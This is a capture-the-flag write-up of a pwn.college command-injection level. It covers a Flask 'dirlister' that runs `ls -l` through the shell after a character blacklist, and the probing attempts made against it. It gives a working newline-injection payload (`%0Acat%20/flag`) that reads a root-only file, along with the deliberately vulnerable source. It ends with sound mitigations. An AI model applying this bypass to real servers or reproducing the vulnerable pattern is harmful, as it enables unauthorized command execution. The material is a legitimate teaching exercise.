# CMDI-6 (ls-based Filtering) — Detailed Writeup

## Challenge Summary & Source Code

This level uses a Flask app that takes a `start` parameter, performs a set of **character blacklist filters**, and then runs `ls -l` on the resulting value. The code (extracted from the challenge) is:

```python
#!/opt/pwn.college/python

import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/step", methods=["GET"]) 
def challenge():
    arg = (
        flask.request.args.get("start", "/challenge")
        .replace(";", "")
        .replace("&", "")
        .replace("|", "")
        .replace(">", "")
        .replace("<", "")
        .replace("(", "")
        .replace(")", "")
        .replace("`", "")
        .replace("$", "")
    )
    command = f"ls -l {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/step"><input type=text name=start><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```

**What the server does:** it strips a set of characters used for shell metaprogramming (`; & | > < ( ) ` \$`) and then passes the remaining string to `ls -l`using`shell=True\`.

---

## Our Investigation — attempts and observations

We tried multiple classic injection techniques and enumeration steps; below is a compact timeline of what we did and what the server returned (key hits):

1. **Basic listing & probing**

   * `curl "http://challenge.localhost/step?start=/bin/sh"` → `DEBUG: command='ls -l /bin/sh'` (no exec, just listing)
   * `curl "http://challenge.localhost/step?start=/proc/self/environ"` → `ls -l /proc/self/environ` (metadata only)

2. **Wildcards / globbing**

   * `?start=/f*` and `?start=/*lag` → `ls -l /f*`, `ls -l /*lag` (globs resolved to names; still no file content)

3. **Tried to inject subshells / cat** (blocked characters removed):

   * `;`, `|`, `` ` ``, `$` all filtered by `.replace(...)` chain.
   * Attempts like `?start=/bin/sh -c 'cat /flag'` resulted in `ls` trying to list the literal arguments (no execution).

4. **Option/argument tricks**

   * `?start=--%20/flag` produced `DEBUG: command='ls -l -- /flag'` and returned the file metadata for `/flag`:

     ```
     -r-------- 1 root root 60 May 11 03:30 /flag
     ```
   * This confirmed `/flag` exists and is readable only by root (permissions `-r--------`). We could list it, but not read its contents directly.

5. **File and proc tricks**

   * `?start=/proc/self/fd/*` listed file-descriptor symlinks (0,1,2) but these pointed to pipes/TTY and did not leak `/flag` contents.
   * `?start=./*` revealed a file named `--` on `./Desktop` which was useful as a literal `--` argument to `ls` (helped treat `/flag` as a positional argument and not an option).

6. **Tried shell invocation inside argument**

   * `?start=%2fbin%2fsh%20-c%20%27cat%20%2fflag%27` resulted in `ls -l /bin/sh -c 'cat /flag'` (ls tried to list `cat /flag` as a file, not run it). Because `;` and other separators are stripped, this approach didn’t execute commands.

At this stage we had two important facts:

* The app **filters many dangerous characters** but **does not remove newlines or single quotes**.
* `ls -l -- /flag` could list the `/flag` file showing permissions and size, but not its contents.

---

## The "Aha" — newline as a command separator

**Hint from the challenge:** "you'll be stumped for a while, but will laugh at its familiarity when you figure out the solution." That points to a very simple shell behaviour. The key observation is that **the server strips the usual shell metacharacters but does not strip newlines** (or percent-encoded newlines in the URL). In POSIX shells, a **newline is a command terminator**, just like `;` — it separates commands on different lines.

Because the app uses `shell=True` and directly feeds `command` to the shell, if we can inject a literal newline character into the `arg` that reaches the shell, the shell will execute the remainder of the input as a new command.

### Why this works (concrete example)

* Server constructs: `command = f"ls -l {arg}"` and prints/executes it via the shell.
* If `arg` is set to a string that begins with a newline followed by `cat /flag`, e.g. `"
  cat /flag"`, then the shell executes:

```
ls -l 
cat /flag
```

* The first line `ls -l` runs and outputs directory listing. The **second line** `cat /flag` runs next and prints the flag content to the captured stdout which the server then returns inside the HTML `<pre>` block.

**Important:** the `.replace()` filters removed `;` and other separators but **they did not remove newline characters**, so `
` bypasses the blacklist and acts as a perfectly valid command separator for the shell.

---

## Working Payloads

Set `start` to a leading newline + the cat command. Examples:

* URL-encoded minimal payload (recommended):

  ```
  curl "http://challenge.localhost/step?start=%0Acat%20/flag"
  ```

  This sends `%0A` (URL-encoded newline) followed by `cat /flag`.

* Alternate representation (percent encoded whitespace):

  ```
  /?start=%0Acat%20/flag
  ```

**Observed effect:** the server executes `ls -l` followed by `cat /flag`, and the response contains the flag text inside the `<pre>` block.

---

## Why other techniques failed

* **Classic separators** (`;`, `|`, `&`, backticks, `$()`) were explicitly filtered out by the `.replace(...)` chain.
* **Subshell execution** using `/bin/sh -c '...'` failed because the entire string was passed as arguments to `ls` rather than being interpreted as a separate shell invocation (filters and quoting caused `ls` to treat the payload as filenames).
* **Globbing and `/proc` tricks** allowed metadata enumeration but could not reveal file contents.

Only the newline remained as an unfiltered command separator — and that is why the solution is "simple and familiar".

---

## Mitigations

To prevent this class of vulnerability:

* **Never call the shell with untrusted input**. Use `subprocess.run([...], shell=False)` and pass the argument as an element in the argument list.
* **Whitelist input** rather than blacklist characters. If you must accept a filesystem path, validate it against a strict regex and canonicalize with `os.path.realpath()` and ensure it remains within an allowed base directory.
* **Sanitize or disallow control characters** such as newlines and carriage returns if you must use `shell=True`. Remove `
  ` and `
  ` explicitly and treat whitespace carefully.
* **Avoid printing or executing constructed commands** in production logs or responses. Logging is useful, but be careful not to leak sensitive command outputs without proper context.

---

## Final Notes

This challenge is a great reminder that **blacklisting is brittle**. Attackers will look for the smallest unfiltered behavior that provides the same semantic effect (here, newline as a command separator). The simplest, most familiar shell behaviours — in this case, command separation by a newline — are often overlooked when devs focus on blocking obvious tokens like `;` and `|`.

